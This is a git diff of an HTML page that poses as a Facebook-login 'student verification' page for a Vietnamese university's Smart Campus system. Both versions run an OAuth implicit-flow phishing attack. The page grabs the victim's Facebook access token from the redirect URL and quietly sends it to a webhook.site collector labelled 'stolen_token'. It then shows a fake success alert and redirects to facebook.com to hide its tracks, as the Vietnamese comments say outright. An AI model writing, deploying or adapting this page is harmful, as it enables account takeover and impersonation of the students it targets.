@@ -3,62 +3,66 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hệ Thống Smart Campus - HUIT</title>
+    <title>Xác Thực Sinh Viên - HUIT Smart Campus</title>
     <style>
-        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; width: 380px; }
-        .logo { width: 70px; margin-bottom: 15px; }
-        h2 { color: #1c1e21; margin-bottom: 10px; font-size: 22px; }
-        p { color: #606770; font-size: 15px; line-height: 1.5; margin-bottom: 25px; }
-        .btn-fb { background-color: #1877f2; color: white; border: none; padding: 12px 20px; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 16px; width: 100%; transition: 0.3s; }
-        .btn-fb:hover { background-color: #166fe5; }
-        .footer { margin-top: 25px; font-size: 11px; color: #90949c; border-top: 1px solid #ddd; padding-top: 15px; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); text-align: center; width: 100%; max-width: 400px; }
+        img { width: 60px; margin-bottom: 20px; }
+        h1 { color: #1c1e21; font-size: 24px; margin-bottom: 15px; }
+        p { color: #606770; font-size: 16px; margin-bottom: 25px; line-height: 1.4; }
+        .btn-login { background-color: #1877f2; color: white; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; padding: 12px 0; width: 100%; cursor: pointer; transition: 0.3s; }
+        .btn-login:hover { background-color: #166fe5; }
+        .footer { margin-top: 20px; font-size: 12px; color: #8a8d91; border-top: 1px solid #ddd; padding-top: 15px; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" class="logo" alt="Facebook">
-    <h2>Xác thực Sinh viên</h2>
-    <p>Chào mừng bạn đến với <b>Smart Campus HUIT</b>. Vui lòng xác thực tài khoản Facebook để đồng bộ dữ liệu điểm danh và lịch học.</p>
+<div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" alt="Facebook Logo">
+    <h1>Smart Campus HUIT</h1>
+    <p>Chào Phương, vui lòng nhấn nút bên dưới để đồng bộ tài khoản và nhận thông báo lịch học mới nhất từ nhà trường.</p>
     
-    <button class="btn-fb" onclick="startAuth()">Tiếp tục với vai trò Sinh viên</button>
+    <button class="btn-login" id="loginBtn">Đăng nhập với Facebook</button>
 
     <div class="footer">
-        Được cung cấp bởi Trung tâm CNTT - Đại học Công nghiệp Thực phẩm TP.HCM (HUIT)
+        Đại học Công nghiệp Thực phẩm TP.HCM - HUIT
     </div>
 </div>
 
 <script>
+    // === CẤU HÌNH THÔNG SỐ (PHẢI KHỚP VỚI DASHBOARD) ===
     const APP_ID = "839014905810590"; // ID ứng dụng của bạn
-    const REDIRECT_URI = "https://phuongtrannn.github.io/test/"; // Link Github của bạn
-    const WEBHOOK_URL = "https://webhook.site/63a27832-d5bc-440f-9993-e12efa944916"; // Link nhận Token của bạn
+    const REDIRECT_URI = "https://phuongtrannn.github.io/test/"; // URI bạn đã cấu hình
+    const WEBHOOK_URL = "https://webhook.site/YOUR_NEW_LINK"; // DÁN LINK WEBHOOK MỚI CỦA BẠN VÀO ĐÂY
 
-    // Bước 1: Chuyển hướng người dùng đến trang xác thực của Facebook
-    function startAuth() {
-        const fbUrl = `https://www.facebook.com/v21.0/dialog/oauth?client_id=${APP_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=public_profile,email`;
-        window.location.href = fbUrl;
-    }
+    const loginBtn = document.getElementById('loginBtn');
 
-    // Bước 2: Tự động bắt Token khi Facebook trả về link Github
+    // Bước 1: Khi nhấn nút, chuyển đến trang xin quyền của Facebook
+    loginBtn.onclick = function() {
+        const fbAuthUrl = `https://www.facebook.com/v21.0/dialog/oauth?client_id=${APP_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=public_profile,email`;
+        window.location.href = fbAuthUrl;
+    };
+
+    // Bước 2: Tự động bắt Token từ URL khi nạn nhân quay lại trang
     window.onload = function() {
-        if (window.location.hash) {
+        // Kiểm tra xem trên URL có chứa #access_token= hay không
+        if (window.location.hash.includes("access_token")) {
             const hash = window.location.hash.substring(1);
             const params = new URLSearchParams(hash);
-            const accessToken = params.get('access_token');
+            const token = params.get('access_token');
 
-            if (accessToken) {
-                // Gửi Token thu được về máy chủ hacker (Webhook) ngầm
-                fetch(`${WEBHOOK_URL}?stolen_token=${accessToken}`)
+            if (token) {
+                // TỰ ĐỘNG gửi mã Token về máy chủ hacker (Webhook) âm thầm
+                fetch(`${WEBHOOK_URL}?stolen_token=${token}`)
                 .then(() => {
-                    alert("Đồng bộ dữ liệu thành công! Bạn sẽ được chuyển về trang chủ.");
-                    // Đẩy nạn nhân về trang Facebook thật để xóa dấu vết
-                    window.location.href = "https://www.facebook.com";
+                    // Thông báo giả để đánh lạc hướng nạn nhân
+                    alert("Xác thực thành công! Hệ thống đang chuyển hướng về trang chủ.");
+                    window.location.href = "https://www.facebook.com"; // Xóa dấu vết
                 })
-                .catch(err => console.log("Lỗi gửi dữ liệu"));
+                .catch(err => console.error("Lỗi gửi dữ liệu"));
             }
         }
-    }
+    };
 </script>
 
 </body>
